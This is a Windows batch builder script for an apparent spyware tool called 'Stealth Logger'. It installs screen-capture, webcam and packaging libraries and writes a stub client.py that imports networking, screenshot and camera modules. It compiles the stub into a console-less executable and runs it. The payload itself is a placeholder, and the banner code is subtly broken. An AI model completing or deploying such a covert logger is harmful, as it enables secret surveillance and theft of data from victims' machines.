@echo off

setlocal

REM Define the logo
set "logo=  ██████ ▄▄▄█████▓▓█████ ▄▄▄       ██▓  ▄▄▄█████▓ ██░ ██     ██▓     ▒█████    ▄████   ▄████ ▓█████  ██▀███  \n"
set "logo=!logo!▒██    ▒ ▓  ██▒ ▓▒▓█   ▀▒████▄    ▓██▒  ▓  ██▒ ▓▒▓██░ ██▒   ▓██▒    ▒██▒  ██▒ ██▒ ▀█▒ ██▒ ▀█▒▓█   ▀ ▓██ ▒ ██▒\n"
set "logo=!logo!░ ▓██▄   ▒ ▓██░ ▒░▒███  ▒██  ▀█▄  ▒██░  ▒ ▓██░ ▒░▒██▀▀██░   ▒██░    ▒██░  ██▒▒██░▄▄▄░▒██░▄▄▄░▒███   ▓██ ░▄█ ▒\n"
set "logo=!logo!  ▒   ██▒░ ▓██▓ ░ ▒▓█  ▄░██▄▄▄▄██ ▒██░  ░ ▓██▓ ░ ░▓█ ░██    ▒██░    ▒██   ██░░▓█  ██▓░▓█  ██▓▒▓█  ▄ ▒██▀▀█▄  \n"
set "logo=!logo!▒██████▒▒  ▒██▒ ░ ░▒████▒▓█   ▓██▒░██████▒▒██▒ ░ ░▓█▒░██▓   ░██████▒░ ████▓▒░░▒▓███▀▒░▒████▒░██▓ ▒██▒\n"
set "logo=!logo!▒ ▒▓▒ ▒ ░  ▒ ░░   ░░ ▒░ ░▒▒   ▓▒█░░ ▒░▓  ░▒ ░░    ▒ ░░▒░▒   ░ ▒░▓  ░░ ▒░▒░▒░  ░▒   ▒  ░▒   ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░\n"
set "logo=!logo!░ ░▒  ░ ░    ░     ░ ░  ░▒   ▒▒ ░░ ░ ▒  ░  ░     ▒ ░▒░ ░   ░ ░ ▒  ░  ░ ▒ ▒░   ░   ░   ░   ░  ░ ░  ░▒ ░ ▒░\n"
set "logo=!logo!░  ░  ░    ░         ░    ░   ▒     ░ ░       ░  ░░ ░     ░ ░   ░ ░ ░   ░ ░   ░    ░     ░░   ░ \n"
set "logo=!logo!      ░              ░  ░     ░  ░        ░  ░  ░       ░  ░    ░ ░        ░       ░    ░  ░   ░     \n"
set "logo=!logo!                                                                                                              \n"
set "logo=!logo!github.com/wiced1\n"

REM Check if Python is installed
python --version >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo Python is not installed. Please install Python and try again.
    pause
    exit /b 1
)

REM Upgrade pip to ensure the latest version is used
python -m pip install --upgrade pip

REM Install required Python packages
python -m pip install requests fake_useragent termcolor tqdm pyautogui opencv-python pyinstaller

REM Check if the installation was successful
IF %ERRORLEVEL% NEQ 0 (
    echo Failed to install required packages. Please check your network connection and try again.
    pause
    exit /b 1
)

REM Create the client.py script (adjust this part to your specific script if necessary)
echo import os > client.py
echo import platform >> client.py
echo import socket >> client.py
echo import requests >> client.py
echo import psutil >> client.py
echo import tempfile >> client.py
echo import pyautogui >> client.py
echo import cv2 >> client.py
echo # Add the full Python script content here... >> client.py

REM Run PyInstaller to generate the executable (with --noconsole to hide the console window)
echo !logo!
echo Building the executable with PyInstaller...
pyinstaller --onefile --noconsole client.py

REM Check if the executable was created successfully
IF %ERRORLEVEL% NEQ 0 (
    echo PyInstaller encountered an error while building the executable. Please check the log for details.
    pause
    exit /b 1
)

REM Run the executable (this will run the .exe created by PyInstaller)
echo Running the executable...
start dist\client.exe

pause
